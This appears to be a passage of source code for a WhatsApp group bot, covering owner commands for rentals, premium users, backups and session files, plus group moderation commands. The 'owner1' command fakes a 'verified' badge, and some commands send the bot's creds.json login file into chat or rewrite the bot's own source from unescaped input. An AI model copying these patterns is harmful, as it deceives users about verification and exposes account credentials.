					m.reply('Success Menambahkan Sewa During ' + (teks2?.replace(/[^0-9]/g, '') || 30) + ' hari\nOtomatis Keluar Saat Waktu Habis!')
				}).catch(e => m.reply('Gagal Menambahkan Sewa!'))
			}
				break
			case 'delsewa': {
				if (!isCreator) return m.reply(mess.owner)
				if (!text) return m.reply(`Example:\n${prefix + command} https://chat.whatsapp.com/xxxx\n Or \n${prefix + command} id_group@g.us`)
				const urlny = text.split('chat.whatsapp.com/')[1].trim()
				if (checkStatus(urlny, sewa)) {
					await m.reply('Success Menghapus Sewa')
					await Avishka.groupLeave(getStatus(urlny, sewa).id).catch(e => { });
					sewa.splice(getPosition(urlny, sewa), 1);
				} else m.reply(`${text} Tidak Terdaftar Di Database\nExample:\n${prefix + command} https://chat.whatsapp.com/xxxx\n Or \n${prefix + command} id_group@g.us`)
			}
				break
			case 'listsewa': {
				if (!isCreator) return m.reply(mess.owner)
				let txt = `*------「 LIST SEWA 」------*\n\n`
				for (let s of sewa) {
					txt += `➸ *ID*: ${s.id}\n➸ *Url*: https://chat.whatsapp.com/${s.url}\n➸ *Expired*: ${formatDate(s.expired)}\n\n`
				}
				m.reply(txt)
			}
				break

	case 'addpr': case 'addprem': case 'addpremium': {
    if (!isCreator) return m.reply(mess.owner)
    
    // Check if input is valid
    if (!text || !text.includes('|')) return m.reply(`*⚠️ වැරදි භාවිතයක්! (Wrong Usage)*\n\nභාවිතා කරන ක්‍රමය:\n*${prefix + command} @tag|දින ගණන*\n\nඋදාහරණ:\n*${prefix + command} @${m.sender.split('@')[0]}|30*`)
    
    let [teks1, teks2] = text.split('|').map(x => x.trim());
    const nmrnya = teks1.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    
    // Check if user is on WhatsApp
    const onWa = await Avishka.onWhatsApp(nmrnya)
    if (onWa.length === 0) return m.reply('*❌ මෙම අංකය WhatsApp හි ලියාපදිංචි වී නොමැත!*')
    
    if (teks2) {
        // Check if user exists in database
        if (db.users[nmrnya]) {
            // Adding premium using expired function
            addExpired({ id: nmrnya, expired: teks2.replace(/[^0-9]/g, '') + 'd' }, premium);
            
            // Success Message
            let successMsg = `*🌟 PREMIUM ADDED SUCCESSFULLY!*

*👤 User:* @${nmrnya.split('@')[0]}
*⏳ Duration:* ${teks2} Days
*🚀 Status:* Activated

දැන් ඔබට සියලුම Premium පහසුකම් භාවිතා කළ හැක. ස්තූතියි!`;

            await Avishka.sendMessage(m.chat, { text: successMsg, mentions: [nmrnya] }, { quoted: m });

            // Update limits/money in database
            db.users[nmrnya].limit += db.users[nmrnya].vip ? limit.vip : limit.premium
            db.users[nmrnya].money += db.users[nmrnya].vip ? money.vip : money.premium
        } else {
            m.reply('*❌ මෙම අංකය බොට්ගේ Database එකේ නැත!*\n\nපරිශීලකයා අවම වශයෙන් එක් වරක් හෝ බොට් සමඟ සම්බන්ධ වී තිබිය යුතුය.')
        }
    } else {
        m.reply(`*⚠️ කාලය (Days) ඇතුළත් කරන්න!*\n\nExample: *${prefix + command} @tag|30*`)
    }
}
break;


			case 'delpr': case 'delprem': case 'delpremium': {
				if (!isCreator) return m.reply(mess.owner)
				if (!text) return m.reply(`Example:\n${prefix + command} @tag`)
				const nmrnya = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (db.users[nmrnya] && db.users[nmrnya].limit >= 0) {
					if (checkStatus(nmrnya, premium)) {
						premium.splice(getPosition(nmrnya, premium), 1);
						m.reply(`Success ${command} @${nmrnya.split('@')[0]}`)
						db.users[nmrnya].limit += db.users[nmrnya].vip ? limit.vip : limit.free
						db.users[nmrnya].money += db.users[nmrnya].vip ? money.vip : money.free
					} else m.reply(`User @${nmrnya.split('@')[0]} Bukan Premium❗`)
				} else m.reply('Nomer tidak terdaftar di BOT !')
			}
				break

			case 'listpr': case 'listprem': case 'listpremium': {
    if (!isCreator) return m.reply(mess.owner)
    
    // Check if there are any premium users
    if (premium.length === 0) return m.reply('*⚠️ දැනට Premium පරිශීලකයින් කිසිවෙකු නොමැත.*')

    let txt = `*─── 「 👑 LIST PREMIUM 👑 」 ───*\n\n`
    txt += `*Total Premium Users:* ${premium.length}\n\n`
    
    for (let userprem of premium) {
        // Checking if user exists in database to avoid errors
        let userLimit = db.users[userprem.id] ? db.users[userprem.id].limit : 'N/A'
        let userMoney = db.users[userprem.id] ? db.users[userprem.id].money.toLocaleString('en-US') : '0'
        
        txt += `🤴 *User:* @${userprem.id.split('@')[0]}\n`
        txt += `📊 *Limit:* ${userLimit}\n`
        txt += `💰 *Money:* ${userMoney}\n`
        txt += `⏳ *Expired:* ${formatDate(userprem.expired)}\n`
        txt += `──────────────────\n\n`
    }
    
    // Sending the list with mentions
    await Avishka.sendMessage(m.chat, { 
        text: txt, 
        mentions: premium.map(a => a.id) 
    }, { quoted: m });
}
break;

			
			
			case 'getcase': {
				if (!isCreator) return m.reply(mess.owner)
				if (!text) return m.reply('Masukkan Nama Casenya!')
				try {
					const getCase = (cases) => {
						return "case" + `'${cases}'` + fs.readFileSync("Avishka.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
					}
					m.reply(`${getCase(text)}`)
				} catch (e) {
					m.reply(`case ${text} tidak ditemukan!`)
				}
			}
				break
			case 'delcase': {
				if (!isCreator) return m.reply(mess.owner)
				if (!text) return m.reply('Masukkan Nama Casenya!')
				fs.readFile('Avishka.js', 'utf8', (err, data) => {
					if (err) {
						console.error('Terjadi kesalahan saat membaca file:', err);
						return;
					}
					const regex = new RegExp(`case\\s+'${text.toLowerCase()}':[\\s\\S]*?break`, 'g');
					const modifiedData = data.replace(regex, '');
					fs.writeFile('Avishka.js', modifiedData, 'utf8', (err) => {
						if (err) {
							m.reply('Terjadi kesalahan saat menulis file: ', err);
						} else m.reply('Case berhasil dihapus dari file');
					});
				});
			}
				break
				
				
				
				
//seccond switchstatement 				
			case 'backup': {
				if (!isCreator) return m.reply(mess.owner)
				switch (args[0]) {
					case 'all':
						let bekup = './database/backup_all.tar.gz';
						tarBackup('./', bekup).then(() => {
							return m.reply({
								document: fs.readFileSync(bekup),
								mimetype: 'application/gzip',
								fileName: 'backup_all.tar.gz'
							})
						}).catch(e => m.reply('Gagal backup: ', + e))
						break
					case 'auto':
						if (set.autobackup) return m.reply('එය දැනටමත් ක්‍රියාකාරි!')
						set.autobackup = true
						m.reply('Success Mengaktifkan Auto Backup')
						break
					case 'session':
						await m.reply({
							document: fs.readFileSync('./session/creds.json'),
							mimetype: 'application/json',
							fileName: 'creds.json'
						});
						break
					case 'database':
						let tglnya = new Date().toISOString().replace(/[:.]/g, '-');
						let datanya = './database/' + tempatDB;
						if (tempatDB.startsWith('mongodb')) {
							datanya = './database/backup_database.json';
							fs.writeFileSync(datanya, JSON.stringify(global.db, null, 2), 'utf-8');
						}
						await m.reply({
							document: fs.readFileSync(datanya),
							mimetype: 'application/json',
							fileName: tglnya + '_database.json'
						})
						break
					default:
						m.reply('use perintah:\n- backup all\n- backup auto\n- backup session\n- backup database');
				}
			}
				break
				
				
				
				
				
			case 'getsession': {
				if (!isCreator) return m.reply(mess.owner)
				await m.reply({
					document: fs.readFileSync('./session/creds.json'),
					mimetype: 'application/json',
					fileName: 'creds.json'
				});
			}
				break
			case 'deletesession': case 'delsession': {
				if (!isCreator) return m.reply(mess.owner)
				fs.readdir('./session', async function (err, files) {
					if (err) {
						console.error('Unable to scan directory: ' + err);
						return m.reply('Unable to scan directory: ' + err);
					}
					let filteredArray = await files.filter(item => ['session-', 'pre-key', 'sender-key', 'app-state'].some(ext => item.startsWith(ext)));
					let teks = `Detected ${filteredArray.length} Session file\n\n`
					if (filteredArray.length == 0) return m.reply(teks);
					filteredArray.map(function (e, i) {
						teks += (i + 1) + `. ${e}\n`
					})
					if (text && text == 'true') {
						let { key } = await m.reply('Menghapus Session File..')
						await filteredArray.forEach(function (file) {
							fs.unlinkSync('./session/' + file)
						});
						sleep(2000)
						m.reply('Berhasil Menghapus Semua cashdata Session', { edit: key })
					} else m.reply(teks + `\nKetik _${prefix + command} true_\nUntuk Menghapus`)
				});
			}
				break
			case 'deletecashdata': case 'delcashdata': {
				if (!isCreator) return m.reply(mess.owner)
				fs.readdir('./system/cashdata', async function (err, files) {
					if (err) {
						console.error('Unable to scan directory: ' + err);
						return m.reply('Unable to scan directory: ' + err);
					}
					let filteredArray = await files.filter(item => ['gif', 'png', 'bin', 'mp3', 'mp4', 'jpg', 'webp', 'webm', 'opus', 'jpeg'].some(ext => item.endsWith(ext)));
					let teks = `Detected ${filteredArray.length} cashdata file\n\n`
					if (filteredArray.length == 0) return m.reply(teks);
					filteredArray.map(function (e, i) {
						teks += (i + 1) + `. ${e}\n`
					})
					if (text && text == 'true') {
						let { key } = await m.reply('Menghapus cashdata File..')
						await filteredArray.forEach(function (file) {
							fs.unlinkSync('./system/cashdata/' + file)
						});
						sleep(2000)
						m.reply('Berhasil Menghapus Semua cashdata', { edit: key })
					} else m.reply(teks + `\nKetik _${prefix + command} true_\nUntuk Menghapus`)
				});
			}
				break
			case 'sc': case 'script': {
				await m.reply(`https://github.com/avishka33\n⬆️ `, {
					contextInfo: {
						forwardingScore: 10,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: my.ch,
							serverMessageId: null,
							newsletterName: 'Join For More Info'
						},
						externalAdReply: {
							title: author,
							body: 'Subscribe My YouTube',
							thumbnail: fake.thumbnail,
							mediaType: 2,
							mediaUrl: my.yt,
							sourceUrl: my.yt,
						}
					}
				})
			}
				break
				


			// Group Menu
			case 'add': {
				if (!m.isGroup) return m.reply(mess.group)
				if (!m.isAdmin) return m.reply(mess.admin)
				if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				if (text || m.quoted) {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
					try {
						await Avishka.groupParticipantsUpdate(m.chat, [numbersOnly], 'add').then(async (res) => {
							for (let i of res) {
								let invv = await Avishka.groupInviteCode(m.chat)
								const statusMessages = {
									200: `Berhasil menambahkan @${numbersOnly.split('@')[0]} ke grup!`,
									401: 'Dia Memblokir Bot!',
									409: 'Dia Sudah Join!',
									500: 'Grup Penuh!'
								};
								if (statusMessages[i.status]) {
									return m.reply(statusMessages[i.status]);
								} else if (i.status == 408) {
									await m.reply(`@${numbersOnly.split('@')[0]} Baru-Baru Saja Keluar Dari Grub Ini!\n\nKarena Target Private\n\nUndangan Akan Dikirimkan Ke\n-> wa.me/${numbersOnly.replace(/\D/g, '')}\nMelalui Jalur Pribadi`)
									await m.reply(`${'https://chat.whatsapp.com/' + invv}\n------------------------------------------------------\n\nAdmin: @${m.sender.split('@')[0]}\nMengundang anda ke group ini\nSilahkan masuk jika berkehendak🙇`, { detectLink: true, chat: numbersOnly, quoted: fkontak }).catch((err) => m.reply('Gagal sending Undangan!'))
								} else if (i.status == 403) {
									let a = i.content.content[0].attrs
									await Avishka.sendGroupInvite(m.chat, numbersOnly, a.code, a.expiration, m.metadata.subject, `Admin: @${m.sender.split('@')[0]}\nMengundang anda ke group ini\nSilahkan masuk jika berkehendak🙇`, null, { mentions: [m.sender] })
									await m.reply(`@${numbersOnly.split('@')[0]} Tidak Dapat Ditambahkan\n\nKarena Target Private\n\nUndangan Akan Dikirimkan Ke\n-> wa.me/${numbersOnly.replace(/\D/g, '')}\nMelalui Jalur Pribadi`)
								} else m.reply('Gagal Add User\nStatus : ' + i.status)
							}
						})
					} catch (e) {
						m.reply('Terjadi Kesalahan! Gagal Add User')
					}
				} else m.reply(`Contoh: ${prefix + command} 94xxx`)
			}
				break
			case 'kick': case 'dor': {
				if (!m.isGroup) return m.reply(mess.group)
				if (!m.isAdmin) return m.reply(mess.admin)
				if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				if (text || m.quoted) {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
					await Avishka.groupParticipantsUpdate(m.chat, [numbersOnly], 'remove').catch((err) => m.reply('Gagal!'))
				} else m.reply(`Contoh: ${prefix + command} 94xxx  `)
			}
				break
			case 'promote': {
				if (!m.isGroup) return m.reply(mess.group)
				if (!m.isAdmin) return m.reply(mess.admin)
				if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				if (text || m.quoted) {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
					await Avishka.groupParticipantsUpdate(m.chat, [numbersOnly], 'promote').catch((err) => m.reply('Gagal!'))
				} else m.reply(`Contoh: ${prefix + command} 94xxx`)
			}
				break
			case 'demote': {
				if (!m.isGroup) return m.reply(mess.group)
				if (!m.isAdmin) return m.reply(mess.admin)
				if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				if (text || m.quoted) {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
					await Avishka.groupParticipantsUpdate(m.chat, [numbersOnly], 'demote').catch((err) => m.reply('Gagal!'))
				} else m.reply(`Contoh: ${prefix + command} 94xxx`)
			}
				break
			case 'warn': case 'warning': {
				if (!m.isGroup) return m.reply(mess.group)
				if (!m.isAdmin) return m.reply(mess.admin)
				if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				if (text || m.quoted) {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
					if (!db.groups[m.chat].warn[numbersOnly]) {
						db.groups[m.chat].warn[numbersOnly] = 1
						m.reply('Peringatan 1/4, akan dikick sewaktu waktu❗')
					} else if (db.groups[m.chat].warn[numbersOnly] >= 3) {
						await Avishka.groupParticipantsUpdate(m.chat, [numbersOnly], 'remove').catch((err) => m.reply('Gagal!'))
						delete db.groups[m.chat].warn[numbersOnly]
					} else {
						db.groups[m.chat].warn[numbersOnly] += 1
						m.reply(`Peringatan ${db.groups[m.chat].warn[numbersOnly]}/4, akan dikick sewaktu waktu❗`)
					}
				} else m.reply(`Contoh: ${prefix + command} 94xxx`)
			}
				break
			case 'unwarn': case 'delwarn': case 'unwarning': case 'delwarning': {
				if (!m.isGroup) return m.reply(mess.group)
				if (!m.isAdmin) return m.reply(mess.admin)
				if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				if (text || m.quoted) {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
					if (db.groups[m.chat]?.warn?.[numbersOnly]) {
						delete db.groups[m.chat].warn[numbersOnly]
						m.reply('Berhasil Menghapus Warning!')
					}
				} else m.reply(`Contoh: ${prefix + command} 94xxx`)
			}
				break
			case 'setname': case 'setnamegc': case 'setsubject': case 'setsubjectgc': {
				if (!m.isGroup) return m.reply(mess.group)
				if (!m.isAdmin) return m.reply(mess.admin)
				if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				if (text || m.quoted) {
					const teksnya = text ? text : m.quoted.text
					await Avishka.groupUpdateSubject(m.chat, teksnya).catch((err) => m.reply('Gagal!'))
				} else m.reply(`Contoh: ${prefix + command} textnya`)
			}
				break
			case 'setdesc': case 'setdescgc': case 'setdesk': case 'setdeskgc': {
				if (!m.isGroup) return m.reply(mess.group)
				if (!m.isAdmin) return m.reply(mess.admin)
				if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				if (text || m.quoted) {
					const teksnya = text ? text : m.quoted.text
					await Avishka.groupUpdateDescription(m.chat, teksnya).catch((err) => m.reply('Gagal!'))
				} else m.reply(`Contoh: ${prefix + command} textnya`)
			}
				break
				
	case 'menus': {
    const sections = [{
        title: "ALPHA VISION MAIN",
        rows: [
            { title: "🎮 Main Menu", id: ".mainmenu", description: "View all commands" },
            { title: "📥 Downloader", id: ".downloadmenu", description: "Social media downloads" }
        ]
    }];

    await Avishka.sendListNative(
        m.chat, 
        "ALPHA VISION INFINITY 🤖", // Title
        "Hello Bro, Welcome!\nSelect a category below.", // Body
        "© 2026 AVI Tech Team", // Footer
        "Choose Menu", // Button Text
        sections, 
        m // Quoted
    );
}
break;
		
				
				
			case 'pin': case 'unpin': {
				if (!m.isGroup) return m.reply(mess.group)
				if (!m.isAdmin) return m.reply(mess.admin)
				if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				await Avishka.sendMessage(m.chat, { pin: { type: command == 'pin' ? 1 : 0, time: 2592000, key: m.quoted ? m.quoted.key : m.key } })
			}
				break
				
			case 'linkgroup': case 'linkgrup': case 'linkgc': case 'urlgroup': case 'urlgrup': case 'urlgc': {
				if (!m.isGroup) return m.reply(mess.group)
				if (!m.isAdmin) return m.reply(mess.admin)
				if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				let response = await Avishka.groupInviteCode(m.chat)
				await m.reply(`https://chat.whatsapp.com/${response}\n\nLink Group : ${(store.groupMetadata[m.chat] ? store.groupMetadata[m.chat] : (store.groupMetadata[m.chat] = await Avishka.groupMetadata(m.chat))).subject}`, { detectLink: true })
			}
				break
			case 'revoke': case 'newlink': case 'newurl': {
				if (!m.isGroup) return m.reply(mess.group)
				if (!m.isAdmin) return m.reply(mess.admin)
				if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				await Avishka.groupRevokeInvite(m.chat).then((a) => {
					m.reply(`Success Menyetel Ulang, Tautan Undangan Grup ${m.metadata.subject}`)
				}).catch((err) => m.reply('Gagal!'))
			}
				break
				
				
//thaird				
			case 'group': case 'grup': case 'gc': {
				if (!m.isGroup) return m.reply(mess.group)
				if (!m.isAdmin) return m.reply(mess.admin)
				if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				let set = db.groups[m.chat]
				switch (args[0]?.toLowerCase()) {
					case 'close': case 'open':
						await Avishka.groupSettingUpdate(m.chat, args[0] == 'close' ? 'announcement' : 'not_announcement').then(a => m.reply(`*Success ${args[0] == 'open' ? 'Membuka' : 'Menutup'} Group*`))
						break
					case 'join':
						const _list = await Avishka.groupRequestParticipantsList(m.chat).then(a => a.map(b => b.jid))
						if (/(a(p|pp|cc)|(ept|rove))|true|ok/i.test(args[1]) && _list.length > 0) {
							await Avishka.groupRequestParticipantsUpdate(m.chat, _list, 'approve').catch(e => m.react('❌'))
						} else if (/reject|false|no/i.test(args[1]) && _list.length > 0) {
							await Avishka.groupRequestParticipantsUpdate(m.chat, _list, 'reject').catch(e => m.react('❌'))
						} else m.reply(`List Request Join :\n${_list.length > 0 ? '- @' + _list.join('\n- @').split('@')[0] : '*Nothing*'}\nExample : ${prefix + command} join acc/reject`)
						break
					case 'pesansementara': case 'disappearing':
						if (/90|7|1|24|on/i.test(args[1])) {
							Avishka.sendMessage(m.chat, { disappearingMessagesInChat: /90/i.test(args[1]) ? 7776000 : /7/i.test(args[1]) ? 604800 : 86400 })
						} else if (/0|off|false/i.test(args[1])) {
							Avishka.sendMessage(m.chat, { disappearingMessagesInChat: 0 })
						} else m.reply('Silahkan Pilih :\n90 hari, 7 hari, 1 hari, off')
						break
					case 'antilink': case 'antivirtex': case 'antidelete': case 'welcome': case 'antitoxic': case 'waktusholat': case 'nsfw': case 'antihidetag': case 'setinfo': case 'antitagsw': case 'leave': case 'promote': case 'demote':
						if (/on|true/i.test(args[1])) {
							if (set[args[0]]) return m.reply('*එය දැනටමත් ක්‍රියාකාරි*')
							set[args[0]] = true
							m.reply('*Sukse Change To On*')
						} else if (/off|false/i.test(args[1])) {
							set[args[0]] = false
							m.reply('*Sukse Change To Off*')
						} else m.reply(`❗${args[0].charAt(0).toUpperCase() + args[0].slice(1)} on/off`)
						break
					case 'setwelcome': case 'setleave': case 'setpromote': case 'setdemote':
						if (args[1]) {
							set.text[args[0]] = args.slice(1).join(' ');
							m.reply(`Success Mengubah ${args[0].split('set')[1]} Menjadi:\n${set.text[args[0]]}`)
						} else m.reply(`Example:\n${prefix + command} ${args[0]} Isi Pesannya\n\nMisal Dengan tag:\n${prefix + command} ${args[0]} Kepada @\nMaka akan Menjadi:\nKepada @0\n\nMisal dengan Tag admin:\n${prefix + command} ${args[0]} Dari @admin untuk @\nMaka akan Menjadi:\nDari @${m.sender.split('@')[0]} untuk @0\n\nMisal dengan Nama grup:\n${prefix + command} ${args[0]} Dari @admin untuk @ di @subject\nMaka akan Menjadi:\nDari @${m.sender.split('@')[0]} untuk @0 di ${m.metadata.subject}`)
						break
					default:
						m.reply(`Settings Group ${m.metadata.subject}\n- open\n- close\n- join acc/reject\n- disappearing 90/7/1/off\n- antilink on/off ${set.antilink ? '🟢' : '🔴'}\n- antivirtex on/off ${set.antivirtex ? '🟢' : '🔴'}\n- antidelete on/off ${set.antidelete ? '🟢' : '🔴'}\n- welcome on/off ${set.welcome ? '🟢' : '🔴'}\n- leave on/off ${set.leave ? '🟢' : '🔴'}\n- promote on/off ${set.promote ? '🟢' : '🔴'}\n- demote on/off ${set.demote ? '🟢' : '🔴'}\n- setinfo on/off ${set.setinfo ? '🟢' : '🔴'}\n- nsfw on/off ${set.nsfw ? '🟢' : '🔴'}\n- waktusholat on/off ${set.waktusholat ? '🟢' : '🔴'}\n- antihidetag on/off ${set.antihidetag ? '🟢' : '🔴'}\n- antitagsw on/off ${set.antitagsw ? '🟢' : '🔴'}\n\n- setwelcome _textnya_\n- setleave _textnya_\n- setpromote _textnya_\n- setdemote _textnya_\n\nExample:\n${prefix + command} antilink off`)
				}
			}
				break
				
				
				
				
			case 'tagall': {
	//			if (!m.isGroup) return m.reply(mess.group)
		//		if (!m.isAdmin) return m.reply(mess.admin)
			//	if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				let setv = pickRandom(listv)
				let teks = `*Tag All*\n\n*Pesan :* ${q ? q : ''}\n\n`
				for (let mem of m.metadata.participants) {
					teks += `${setv} @${mem.id.split('@')[0]}\n`
				}
				await m.reply(teks, { mentions: m.metadata.participants.map(a => a.id) })
			}
				break
			case 'hidetag': case 'h': {
				if (!m.isGroup) return m.reply(mess.group)
				if (!m.isAdmin) return m.reply(mess.admin)
				if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				await m.reply(q ? q : '', { mentions: m.metadata.participants.map(a => a.id) })
			}
				break
			case 'totag': {
				if (!m.isGroup) return m.reply(mess.group)
				if (!m.isAdmin) return m.reply(mess.admin)
				if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				if (!m.quoted) return m.reply(`Reply pesan dengan caption ${prefix + command}`)
				delete m.quoted.chat
				await Avishka.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: m.metadata.participants.map(a => a.id) })
			}
				break
			case 'listonline': case 'liston': {
				if (!m.isGroup) return m.reply(mess.group)
				let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
				if (!store.presences || !store.presences[id]) return m.reply('Sedang Tidak ada yang online!')
				let online = [...Object.keys(store.presences[id]), botNumber]
				await m.reply('List Online:\n\n' + online.map(v => setv + ' @' + v.replace(/@.+/, '')).join`\n`, { mentions: online }).catch((e) => m.reply('Sedang Tidak Ada Yang Online..'))
			}
				break
			/*|⬡════════════════════════════════════════════|❝   𝙰vi -   Bot Menu..  ™ ❞|═══════════════════════════════════════════⬡|*/
case 'owner1': {
    // Verified Badge එක සඳහා Unicode අක්ෂරය (✔) නම අසලට එකතු කිරීම
    const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 
                  'FN:Avishka Shavinda 🇱🇰\n' + // මෙතන නම අසල Green Tick එක වගේ පේන Unicode එක තියෙන්නේ
                  'ORG:Official Bot Owner;\n' + 
                  'TEL;type=CELL;type=VOICE;waid=94772836332:94772836332\n' + // ඔයාගේ අංකය මෙතනට දාන්න
                  'END:VCARD';

    await Avishka.sendMessage(m.chat, { 
        contacts: { 
            displayName: 'PRINCE AVI ✔', 
            contacts: [{ vcard }] 
        },
        contextInfo: {
            // පණිවිඩය 'Official' විදිහට පෙන්වීමට Ad Attribution භාවිතා කිරීම
            externalAdReply: {
                title: 'OFFICIAL OWNER VERIFIED',
                body: 'Verified System Administrator',
                mediaType: 1,
                previewType: 0,
                showAdAttribution: true, // මෙන්න මේකෙන් පණිවිඩය උඩ "Verified" badge එකක් වගේ ලකුණක් එනවා
                renderLargerThumbnail: false,
                sourceUrl: 'https://wa.me/94772836332'
            }
        }
    }, { quoted: m });
}
break;
		
			

			case 'owner': {
				await Avishka.sendContact(m.chat, owner, m);
			}
				break
			case 'profile': case 'cek': {
				const user = Object.keys(db.users)
				const infoUser = db.users[m.sender]
				await m.reply(`*👤Profile @${m.sender.split('@')[0]}* :\n🐋User Bot : ${user.includes(m.sender) ? 'True' : 'False'}\n🔥User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}${isPremium ? `\n⏳Expired : ${checkStatus(m.sender, premium) ? formatDate(getExpired(m.sender, db.premium)) : '-'}` : ''}\n🎫Limit : ${infoUser.limit}\n💰Uang : ${infoUser ? infoUser.money.toLocaleString('id-ID') : '0'}`)
			}
				break
			case 'leaderboard': {
				const entries = Object.entries(db.users).sort((a, b) => b[1].money - a[1].money).slice(0, 10).map(entry => entry[0]);
				let teksnya = '╭──❍「 *LEADERBOARD* 」❍\n'
				for (let i = 0; i < entries.length; i++) {
					teksnya += `│• ${i + 1}. @${entries[i].split('@')[0]}\n│• Balance : ${db.users[entries[i]].money.toLocaleString('id-ID')}\n│\n`
				}
				m.reply(teksnya + '╰──────❍');
			}
				break
			case 'totalpesan': {
				let messageCount = {};
				let messages = store?.messages[m.chat]?.array || [];
				let participants = m?.metadata?.participants?.map(p => p.id) || store?.messages[m.chat]?.array?.map(p => p.key.participant) || [];
				messages.forEach(mes => {
					if (mes.key?.participant && mes.message) {
						messageCount[mes.key.participant] = (messageCount[mes.key.participant] || 0) + 1;
					}
				});
				let totalMessages = Object.values(messageCount).reduce((a, b) => a + b, 0);
				let date = new Date().toLocaleDateString('id-ID');
				let zeroMessageUsers = participants.filter(user => !messageCount[user]).map(user => `- @${user.replace(/[^0-9]/g, '')}`);
				let messageList = Object.entries(messageCount).map(([sender, count], index) => `${index + 1}. @${sender.replace(/[^0-9]/g, '')}: ${count} Pesan`);
				let result = `Total Pesan ${totalMessages} dari ${participants.length} anggota\nPada Avidate ${date}:\n${messageList.join('\n')}\n\nNote: ${text.length > 0 ? `\n${zeroMessageUsers.length > 0 ? `Sisa Anggota yang tidak sending pesan (Sider):\n${zeroMessageUsers.join('\n')}` : 'Semua anggota sudah sending pesan!'}` : `\nCek Sider? ${prefix + command} --sider`}`;
				m.reply(result)
			}
				break
			case 'req': case 'request': {
				if (!text) return m.reply('Mau Request apa ke Owner?')
				await m.reply(`*Request Telah Terkirim Ke Owner*\n_Terima Kasih🙏_`)
				await Avishka.sendFromOwner(owner, `Pesan Dari : @${m.sender.split('@')[0]}\nUntuk Owner\n\nRequest ${text}`, m, { contextInfo: { mentionedJid: [m.sender], isForwarded: true } })
			}
				break
			case 'totalfitur': {
				const total = ((fs.readFileSync('./Avishka.js').toString()).match(/case '/g) || []).length
				m.reply(`Total Fitur : ${total}`);
			}
				break
			case 'daily': case 'claim': {
				daily(m, db)
			}
				break
			case 'transfer': case 'tf': {
				transfer(m, args, db)
			}
				break
			case 'buy': {
				buy(m, args, db)
			}
				break
			case 'react': {
				Avishka.sendMessage(m.chat, { react: { text: args[0], key: m.quoted ? m.quoted.key : m.key } })
			}
				break
			case 'tagme': {
				m.reply(`@${m.sender.split('@')[0]}`, { mentions: [m.sender] })
			}
				break
			
//forth								
			case 'runtime':  case 'bot': {
				switch (args[0]) {
					case 'mode': case 'public': case 'self':
						if (!isCreator) return m.reply(mess.owner)
						if (args[1] == 'public' || args[1] == 'all') {
							if (Avishka.public && set.grouponly && set.privateonly) return m.reply('*එය දැනටමත් ක්‍රියාකාරි*')
							Avishka.public = set.public = true
							set.grouponly = true
							set.privateonly = true
							m.reply('*පොදු භාවිතයට වෙනස් කර ඇත.*')
						} else if (args[1] == 'self') {
							set.grouponly = false
							set.privateonly = false
							Avishka.public = set.public = false
							m.reply('*ස්වයං භාවිතයට වෙනස් කර ඇත.*')
						} else if (args[1] == 'group') {
							set.grouponly = true
							set.privateonly = false
							m.reply('*කණ්ඩායම් භාවිතයට වෙනස් කර ඇත.*')
						} else if (args[1] == 'private') {
							set.grouponly = false
							set.privateonly = true
							m.reply('*පුදිගලිකයි*')
						} else m.reply('Mode self/public/group/private/all')
						break
					case 'anticall': case 'autobio': case 'autoread': case 'autotyping': case 'readsw': case 'multiprefix': case 'antispam':
						if (!isCreator) return m.reply(mess.owner)
						if (args[1] == 'on') {
							if (set[args[0]]) return m.reply('*එය දැනටමත් ක්‍රියාකාරි*')
							set[args[0]] = true
							m.reply('*Change To On*')
						} else if (args[1] == 'off') {
							set[args[0]] = false
							m.reply('*Change To Off*')
						} else m.reply(`${args[0].charAt(0).toUpperCase() + args[0].slice(1)} on/off`)
						break
					case 'set': case 'settings':
						let settingsBot = Object.entries(set).map(([key, value]) => {
							let list = key == 'status' ? new Date(value).toLocaleString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' }) : (typeof value === 'boolean') ? (value ? 'on🟢' : 'off🔴') : value;
							return `- ${key.charAt(0).toUpperCase() + key.slice(1)} : ${list}`;
						}).join('\n');
						m.reply(`Settings Bot @${botNumber.split('@')[0]}\n${settingsBot}\n\nExample: ${prefix + command} mode`);
						break
					default:
						if (args[0] || args[1]) m.reply(`*Please Sellect Settings :*\n- Mode : *${prefix + command} mode self/public*\n- Anti Call : *${prefix + command} anticall on/off*\n- Auto Bio : *${prefix + command} autobio on/off*\n- Auto Read : *${prefix + command} autoread on/off*\n- Auto Typing : *${prefix + command} autotyping on/off*\n- Read Sw : *${prefix + command} readsw on/off*\n- Multi Prefix : *${prefix + command} multiprefix on/off*`)
				}
